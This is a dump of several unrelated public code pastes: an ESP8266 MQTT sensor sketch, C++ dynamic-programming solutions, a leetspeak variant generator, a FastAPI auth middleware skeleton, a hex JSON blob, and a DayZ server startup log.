const char* mqtt_username = ""your MQTT username"";
const char* mqtt_password = ""your MQTT password"";
const char* clientID = ""any string you want""; // The client id identifies the ESP8266 device.

// Initialise the WiFi and MQTT Client objects
WiFiClient wifiClient;
PubSubClient client(mqtt_server, mqtt_port, wifiClient);

void connect_MQTT(){
  Serial.print(""Connecting to "");
  Serial.println(ssid);

  // Connect to the WiFi
  WiFi.begin(ssid, wifi_password);

  // Wait until the connection has been confirmed before continuing
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(""."");
  }
  // Debugging - Output the IP Address of the ESP8266
  Serial.println(""WiFi connected"");
  Serial.print(""IP address: "");
  Serial.println(WiFi.localIP());

  // Connect to MQTT Broker
  // client.connect returns a boolean value to let us know if the connection was successful.
  if (client.connect(clientID, mqtt_username, mqtt_password)) {
    Serial.println(""Connected to MQTT Broker!"");
  }
  else {
    Serial.println(""Connection to MQTT Broker failed..."");
  }
}

void setup() {
  Serial.begin(115200);
  Serial.setTimeout(2000);

  dht.begin();
  connect_MQTT();

  // Read data from DHT22 sensor
  float temperature = dht.readTemperature();
  float humidity = dht.readHumidity();

  Serial.print(""Temperature: "");
  Serial.print(temperature);
  Serial.println("" °C""); 
  Serial.print(""Humidity: "");
  Serial.print(humidity);
  Serial.println("" %"");

  // Create JSON string from temperature and humidity values
  JSONVar data;
  data[""temperature""] = temperature;
  data[""humidity""] = humidity;
  String jsonString = JSON.stringify(data);

  // PUBLISH to the MQTT Broker
  if (client.publish(mqtt_topic, String(jsonString).c_str())) {
    Serial.println(""Data sent!"");
  }
  // client.publish will return a boolean value depending on whether it succeded or not.
  // If the message failed to send, we will try again, as the connection may have broken.
  else {
    Serial.println(""Data failed to send. Reconnecting to MQTT Broker and trying again"");
    client.connect(clientID, mqtt_username, mqtt_password);
    delay(10); // This delay ensures that client.publish doesn't clash with the client.connect call
    client.publish(mqtt_topic, String(jsonString).c_str());
  }

  Serial.print(""Connection state of client: "");
  Serial.println(client.state());
  if (client.state() == 1) {
    client.disconnect();
  }
  Serial.println(""--------------------------------------------------------------"");

  delay(10); // This delay ensures that client.publish finish before entering deep sleep
  ESP.deepSleep(300e6); //Enter ESP8266 into deep sleep for 5 mins (300x10^6 millisecs)
  // Important!!! Make sure to phisically short-wire D0 and RST on NodeMCU board!!!
}
 
void loop() {
}
"
rEjQYn4M,data674,TestGuy1,JSON,Thursday 24th of August 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c9feac2cb91a8dc87eb4132a9f9d2bfa0d71dbb401978219d0df493ac8d34338e0c3c683203ff6d5505a89e656ccf30a5084be5e30d07edcc0e044b9e8243f9127408c0f64daa53f78e35a6bd5a96366e777cd963315eb016eb9ab527642567ec7b7f6652afc7fc025053a6b246eda800410d1f0d2b6d5cd784e7c493a5ccd3f',
  otherdata: [
    '68bb7c34f0673a69325c756c74a916e1',
    '047fcdded798418599c6e6211124a876',
    'ebb78220d50f900082ff5aaaa70b6157',
    '7743562ea66c7f32e9d0bd8db3a5e4bb',
    '9ceb0f8fee3ab982359d309781305c78',
    '11ff6ea8261ee4e41ed4dd0c349680e0',
    '91cbd42411b3d7ae22a5e1ddb7f07387',
    '67d6a2b37730142c7750a0fac007019d'
  ]
}"
XCwUsww2,Coin Combinations I,LEGEND2004,C++,Thursday 24th of August 2023 05:51:17 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long
const int INF = 1e9;
const int mod = 1e9 + 7;
const int N = 1e6 + 5;
int dp[N];

signed main()
{
    int n , x;
    cin >> n >> x;
    int a[n + 5];
    for(int i = 0; i < n; i++){
        cin >> a[i];
    }
    dp[0] = 1;
    for(int i = 1; i <= x; i++){
        for(int j = 0; j < n; j++){
            if(i >= a[j])
                dp[i] += dp[i - a[j]];
            dp[i] %= mod;
        }
    }
    cout << dp[x] << endl;
}
"
jFAnCvXT,ASCII-Inspired Permutation Generator: Customizable Symbol and Number Combinations,LoveCalculus,Python,Thursday 24th of August 2023 05:48:42 AM CDT,"# -*- coding: utf-8 -*-
from typing import NewType
from itertools import product

#! This script will generate a certain [word] where each letter are similar to other ASCII characters (E.g. S=$, A=4), and generate possible permutations, with configureable limiter, and mode (-s ""Symbol only"", -n ""Number only"", -ns\-sn ""Symbol & Number only"")
def generate_variations(word:str,nth:int, mode:str) -> list:
    #? Type(s) Alias
    permutationVariate = NewType('permutationVariate', str)
    alphabetVariate = NewType('alphabetVariate', 'dict[str, list[str]]')

    Variation:permutationVariate = []  #? Possible set can be made through permutation of plaintext
    
    #? Common variations of alphabet
    alphabet_variation_symbols:alphabetVariate = {
    'a': ['Λ', 'Δ', '∀', 'a', 'A'],
    'b': ['ß', 'b', 'B'],
    'c': ['©', 'ς', '¢', 'c', 'C'],
    'd': ['Ð', 'd', 'D'],
    'e': ['Є', '€', 'Σ', 'e', 'E'],
    'f': ['ƒ', 'f', 'F'],
    'g': ['&', 'Ĝ', 'Ğ', 'g', 'G'],
    'h': ['#', '|-|', 'Ή', 'h', 'H'],
    'i': ['!', '|', '¡', 'Í', 'Ï', 'i', 'I'],
    'j': ['_|', '¿', 'i', 'j', 'J'],
    'k': ['|<', '|{', 'Κ', 'k', 'K'],
    'l': ['£', '|_', '£', 'l', 'L'],
    'm': ['Μ', 'm', 'M'],
    'n': ['И', 'en', 'n', 'N'],
    'o': ['0', 'Ο', 'Θ', '()', 'o', 'O'],
    'p': ['¶', '₱', '|°', 'p', 'P'],
    'q': ['ϑ', 'q', 'Q'],
    'r': ['®', '|^', 'r', 'R'],
    's': ['$', '§', 'ʂ', 's', 'S'],
    't': ['+', '†', 't', 'T'],
    'u': ['µ', '|_|', 'u', 'U'],
    'v': ['\\/', 'v', 'V'],
    'w': ['ɯ', 'ω', 'vv', 'w', 'W'],
    'x': ['×', 'x', 'X'],
    'y': ['¥', 'y', 'Y'],
    'z': ['%', 'z', 'Z']
}

    alphabet_variation_numeric:alphabetVariate = {
    'a': ['4', 'A', 'a'],
    'b': ['13', 'B', 'b'],
    'c': ['©', 'C', 'c'],
    'd': ['d', 'D'],
    'e': ['3', 'E', 'e'],
    'f': ['f', 'F'],
    'g': ['6', 'G', 'g'],
    'h': ['h', 'H'],
    'i': ['1', 'I', 'i'],
    'j': ['j', '1', 'J'],
    'k': ['k', 'K'],
    'l': ['1', 'L', 'l'],
    'm': ['m', 'M'],
    'n': ['n', 'N'],
    'o': ['0', 'O', 'o'],
    'p': ['¶', 'P', 'p'],
    'q': ['0', 'Q', 'q'],
    'r': ['r', 'R'],
    's': ['5', 'S', 's'],
    't': ['7', 'T', 't'],
    'u': ['u', 'U'],
    'v': ['v', 'V'],
    'w': ['w', 'W'],
    'x': ['x', 'X'],
    'y': ['y', 'Y'],
    'z': ['2', 'Z', 'z']
}


    alphabet_variation_numerimbol = {
    'a': ['4', 'Λ', 'Δ', '∀', 'A', 'a'],
    'b': ['13', 'ß', 'B', 'b'],
    'c': ['©', 'ς', '¢', 'C', 'c'],
    'd': ['d', 'Ð', 'D'],
    'e': ['3', 'Є', '€', 'Σ', 'E', 'e'],
    'f': ['f', 'ƒ', 'F'],
    'g': ['6', '&', 'Ĝ', 'Ğ', 'G', 'g'],
    'h': ['h', '#', '|-|', 'Ή', 'H', 'h'],
    'i': ['1', '!', '|', '¡', 'Í', 'Ï', 'I', 'i'],
    'j': ['j', '1', '_|', '¿', 'i', 'J', 'j'],
    'k': ['k', '|<', '|{', 'Κ', 'K', 'k'],
    'l': ['1', '£', '|_', '£', 'L', 'l'],
    'm': ['m', 'Μ', 'M', 'm'],
    'n': ['И', 'en', 'N', 'n'],
    'o': ['0', 'Ο', 'Θ', '()', 'O', 'o'],
    'p': ['¶', '₱', '|°', 'P', 'p'],
    'q': ['0', 'ϑ', 'Q', 'q'],
    'r': ['r', '®', '|^', 'R', 'r'],
    's': ['5', '$', '§', 'ʂ', 'S', 's'],
    't': ['7', '+', '†', 'T', 't'],
    'u': ['u', 'µ', '|_|', 'U', 'u'],
    'v': ['v', '\\/', 'V', 'v'],
    'w': ['w', 'ɯ', 'ω', 'vv', 'W', 'w'],
    'x': ['x', '×', 'X', 'x'],
    'y': ['y', '¥', 'Y', 'y'],
    'z': ['2', '%', 'Z', 'z']
}

    if mode == '-s':
        substitute_values = [alphabet_variation_symbols[letter] for letter in word] 
        combinations = product(*substitute_values)

        for combo in combinations:
            variation = word
            for letter, value in zip(word, combo):
                variation = variation.replace(letter, value)
            Variation.append(variation)

    elif mode == '-n':
        substitute_values = [alphabet_variation_numeric[letter] for letter in word] 
        combinations = product(*substitute_values)

        for combo in combinations:
            variation = word
            for letter, value in zip(word, combo):
                variation = variation.replace(letter, value)
            Variation.append(variation)
            
    elif mode == '-sn' or mode == '-ns':
        substitute_values = [alphabet_variation_numerimbol[letter] for letter in word] 
        combinations = product(*substitute_values)

        for combo in combinations:
            variation = word
            for letter, value in zip(word, combo):
                variation = variation.replace(letter, value)
            Variation.append(variation)

    grammar = ''
    if nth>1: 
        grammar = 'ies' 
    else: 
        grammar = 'y'

    print(f'Printing {nth} possibilit{grammar}, (Actual possibilities: {len(Variation)})')
    for i in range(min(nth, len(Variation))):
        variation = Variation[i]
        print(variation) 
    print(f'Printed {nth} possibilit{grammar}, (Actual possibilities: {len(Variation)})')

generate_variations('lol',112501,'-ns')"
gCnq7tgc,AuthMiddleware from instance to pure skeleton,bozhilov,Python,Thursday 24th of August 2023 05:48:22 AM CDT,"from fastapi import Request
from fastapi.responses import JSONResponse
from fastapi.encoders import jsonable_encoder
from typing import Final
from requests import post

# add endpoints which need to bypass the request verification in this dict
# with their appropriate method type or ""*"" in order to allow all types
BYPASSED_ENDPOINTS: Final = {""/health"": [""GET""]}


class AuthMiddleware:
    """"""Utility class for easily initializing all authentication middleware""""""

    @classmethod
    def bind(cls, app):
        @app.middleware(""http"")
        async def verify_request(request: Request, call_next):
            for endpoint, methods in BYPASSED_ENDPOINTS.items():
                if endpoint not in str(request.url) or (
                    request.method not in methods and methods[0] != ""*""
                ):
                    validate_url = f""{request.url.components.scheme}://{request.base_url if not request.base_url.netloc.find(':') else request.base_url.netloc.split(':')[0]}:8000/api/validate""

                    try:
                        res = post(url=validate_url, headers=request.headers)
                    except Exception as e:
                        return cls._generate_bad_auth_response(exception=e)

                    if res.status_code != 200:
                        return cls._generate_bad_auth_response()

            response = await call_next(request)
            return response

    def _generate_bad_auth_response(self, exception=None):
        content = {
            ""message"": ""User doesn't have permissions to access this resource!"",
        }
        status_code = 401

        if exception:
            content = {
                ""message"": ""Something went wrong when verifying the request!"",
                ""exception"": str(exception),
            }

            status_code = 500

        return JSONResponse(content=jsonable_encoder(content), status_code=status_code)
"
pAvjdayW,Frog 2,LEGEND2004,C++,Thursday 24th of August 2023 05:37:27 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long
const int INF = 1e9;
const int mod = 1e9 + 7;
const int N = 1e6 + 5;
int dp[N];

signed main()
{
    int n , k;
    cin >> n >> k;
    int a[n + 5];
    for(int i = 1; i <= n; i++){
        cin >> a[i];
    }
    dp[1] = 0;
    for(int i = 2; i <= n; i++){
        dp[i] = INF;
        for(int j = 1; j <= k; j++){
            if(i == j)
                break;
            dp[i] = min(dp[i] , dp[i - j] + abs(a[i] - a[i - j]));
        }
    }
    cout << dp[n] << endl;
}
"
s580evnH,DayZ sturtup log,Denisle,XML,Thursday 24th of August 2023 05:31:00 AM CDT,"11:09:58 Создан выделенный сервер.
11:09:59 [Inputs] Loading inputs default ""bin/constants.xml""
11:09:59 [Inputs] Loading inputs default ""bin/specific.xml""
11:09:59 [Inputs] Loading inputs default ""JM/COT/Scripts/Data/Inputs.xml""
11:09:59 !!! [Inputs] Cannot Register ""UAObjectModuleDeleteOnCursor"" non-existent input - Fix Preset!
11:09:59 [Inputs] Loading inputs default ""MyMODS/sGunplay/scripts/data/inputs.xml""
11:09:59 [Inputs] Loading inputs default ""VanillaPPMap/data/modded_Inputs.xml""
11:09:59 [Inputs] Loading inputs default ""VPPAdminTools/data/modded_Inputs.xml""
11:09:59 [Inputs] Loading inputs default ""DayZExpansion/AI/Scripts/inputs.xml""
11:09:59 [Inputs] Loading inputs cfg ""profiles\Users\Survivor\Server.core.xml""
11:09:59 !!! [Inputs] Cannot read inputs cfg ""profiles\Users\Survivor\Server.core.xml"", parser error
11:09:59 [Inputs] Loading inputs cfg ""bin/core.xml""
11:09:59 !!! [Inputs] Cannot load input preset ""#STR_USER"", file does not exist
11:09:59 [Inputs] Exporting inputs cfg ""profiles\Users\Survivor\Server.core.xml""
11:10:07 BattlEye Server: Initialized (v1.219, DayZ 1.21.156300)
11:10:07 SUCCESS: SteamGameServer_Init(0,8766,2312,27017,3,1.21.156300)
11:10:07 BattlEye Server: Config entry: RConPassword Password
11:10:07 BattlEye Server: Config entry: RestrictRCon 0
11:10:07 BattlEye Server: Config entry: RConPort 2316
11:10:07 Роли назначены.
11:10:07 Чтение задания...
11:10:29 [CE][Hive] :: Initializing OFFLINE
11:10:29 [StorageDirs] :: Selected storage directory: C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\
11:10:29 [CE][Hive] :: Loading core data ... 
11:10:29 [CE][CoreData] :: 7 root classes, 18 defaults, 0 updaters...
11:10:36 [CE][TypeSetup] :: 573 classes setuped...
11:10:36 [CE][TypeSetup] :: 68 classes setuped...
11:10:38 [CE][LoadPrototype] :: loaded 379 prototypes
11:10:38   765 containers, 9747 points
11:10:38   36 dispatches, 128 proxies
11:10:38 !!! [CE][LoadPrototype] 5 groups have no points...
11:10:38 [CE][LoadPrototype] :: loaded 379 prototypes
11:10:38   765 containers, 9747 points
11:10:38   36 dispatches, 128 proxies
11:10:38 !!! [CE][LoadPrototype] 5 groups have no points...
11:10:38 [CE][LoadPrototype] :: last group name: Land_Wreck_Tractor_DE...
11:10:38 [CE][LoadPrototype] :: loaded 0 prototypes
11:10:38   55 containers, 232 points
11:10:38   0 dispatches, 0 proxies
11:10:38 [CE][LoadPrototype] :: last group name: Rail9...
11:10:39 [CE][LoadMap] ""Group"" :: loaded 11704 groups, groups failed: 0, largest group range: 34.2
11:10:39 [CE][LoadMap] ""Dirt"" :: loaded 0 groups, groups failed: 0, largest group range: 34.2
11:10:39 [CE][LoadClusters] ""Cluster"" :: Loading files...
11:10:40 [CE][LoadClusters] :: file: ""mapgroupcluster.xml"", 9 types, 50000 instances
11:10:40 [CE][LoadClusters] :: file: ""mapgroupcluster01"", 9 types, 50000 instances
11:10:40 [CE][LoadClusters] :: file: ""mapgroupcluster02"", 9 types, 50000 instances
11:10:40 [CE][LoadClusters] :: file: ""mapgroupcluster03"", 9 types, 50000 instances
11:10:40 [CE][LoadClusters] :: file: ""mapgroupcluster04"", 9 types, 17347 instances
11:10:40 [CE][Storage] ver:21 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\types.bin""
11:10:40 [CE][Storage] ver:21 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\types.001""
11:10:40 [CE][Storage] ver:21 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\types.002""
11:10:40 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\types.bin"".
11:10:41 !!! [CE] :: Unknown usage: 'Historical'.
11:10:41 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_000.002""
11:10:41 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_000.bin"" 878 items.
11:10:41 [CE][DE][GROUPS] :: Total eventgroups defined: 83, Eventgroups in use: 83
11:10:41 [CE][Storage] ver:21 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\events.bin""
11:10:41 [CE][Storage] ver:21 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\events.001""
11:10:41 [CE][Storage] ver:21 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\events.002""
11:10:41 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\events.bin"".
11:10:41 [CE][DynamicEvent] Load  Events:[47] Primary spawners: 47 Secondary spawners: 4
11:10:41 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_000.bin""
11:10:41 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_000.001""
11:10:41 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_000.002""
11:10:41 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_000.bin"" 878 items.
11:10:42   878 items loaded. (0 failed)
11:10:42 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_001.bin""
11:10:42 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_001.001""
11:10:42 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_001.002""
11:10:42 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_001.bin"" 1794 items.
11:10:44   1794 items loaded. (0 failed)
11:10:44 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_002.bin""
11:10:44 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_002.001""
11:10:44 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_002.002""
11:10:44 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_002.bin"" 2460 items.
11:10:46   2460 items loaded. (0 failed)
11:10:46 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_003.bin"" 2420 items.
11:10:46 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_003.001""
11:10:46 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_003.002""
11:10:46 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_003.bin"" 2420 items.
11:10:48 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_004.bin"" 1779 items.
11:10:48 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_004.bin""
11:10:48 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_004.001""
11:10:48 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_004.002""
11:10:48 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_004.bin"" 1779 items.
11:10:49 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_005.bin""
11:10:49 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_005.bin""
11:10:49 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_005.001""
11:10:49 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_005.002""
11:10:49 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_005.bin"" 2012 items.
11:10:50   2012 items loaded. (0 failed)
11:10:50 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_006.bin""
11:10:50 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_006.001""
11:10:50 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_006.002""
11:10:50 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_006.bin"" 1616 items.
11:10:51 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_007.001""
11:10:51 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_007.002""
11:10:51 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_007.001""
11:10:51 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_007.002""
11:10:51 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_007.bin"" 1384 items.
11:10:52   1384 items loaded. (0 failed)
11:10:52 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_008.bin""
11:10:52 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_008.001""
11:10:52 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_008.002""
11:10:52 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_008.bin"" 2129 items.
11:10:53   2129 items loaded. (0 failed)
11:10:53 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_009.bin""
11:10:53 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_009.001""
11:10:53 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_009.002""
11:10:53 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_009.bin"" 2585 items.
11:10:55 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_010.002""
11:10:55 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_010.bin"" 1799 items.
11:10:55 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_010.001""
11:10:55 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_010.002""
11:10:55 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_010.bin"" 1799 items.
11:10:56   1799 items loaded. (0 failed)
11:10:56 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_011.bin""
11:10:56 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_011.001""
11:10:56 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_011.002""
11:10:56 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\dynamic_011.bin"" 195 items.
11:10:57 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\vehicles.bin""
11:10:57 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\vehicles.001""
11:10:57 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\vehicles.002""
11:10:57 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\vehicles.bin"" 8162 items.
11:10:57 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\building.bin"" 0 items.
11:10:57   0 items loaded. (0 failed)
11:10:57 [CE][Storage] ver:25 stamp:119541, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\vehicles.bin""
11:10:57 [CE][Storage] ver:25 stamp:119537, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\vehicles.001""
11:10:57 [CE][Storage] ver:25 stamp:119538, valid:yes, name:""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\vehicles.002""
11:10:57 [CE][Storage] Restoring file ""C:\DayzServer\servers\Chernarus\mpmissions\dayzOffline.chernarusplus\storage_1\data\vehicles.bin"" 8162 items.
11:11:01   8162 items loaded. (0 failed)
11:11:01 [CE][Hive] :: Storage load took:19.84 seconds, recovery stamp:119541
11:11:01   entity: 32853, building: 0
11:11:01   no lifetime: 7968
11:11:01   pathgraph's: 8479
11:11:01 [CE][Hive] :: Initializing ... 
11:11:01 [CE][InitializeMap] :: initialized: 0
11:11:01 [CE][Hive] :: Initializing spawners ... 
11:11:02 [CE][DynEvent] :: 47 types
11:11:02 [00] AmbientHen
11:11:02 [CE][DynEvent] :: 47 types
11:11:02 [00] AmbientHen
11:11:02   Primary Spawner: ""Ambient"", active: yes, repeat: 1
11:11:02 [01] AnimalBear
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [02] AnimalCow
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [03] AnimalDeer
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [04] AnimalGoat
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [05] AnimalPig
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [06] AnimalRoeDeer
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [07] AnimalSheep
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [08] AnimalWildBoar
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [09] AnimalWolf
11:11:02   Primary Spawner: ""Animal"", active: yes, repeat: 1
11:11:02 [10] InfectedArmy
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [11] InfectedArmyHard
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [12] InfectedCity
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [13] InfectedCityTier1
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [14] InfectedFirefighter
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
11:11:02 [15] InfectedIndustrial
11:11:02   Primary Spawner: ""Infected"", active: yes, repeat: 1
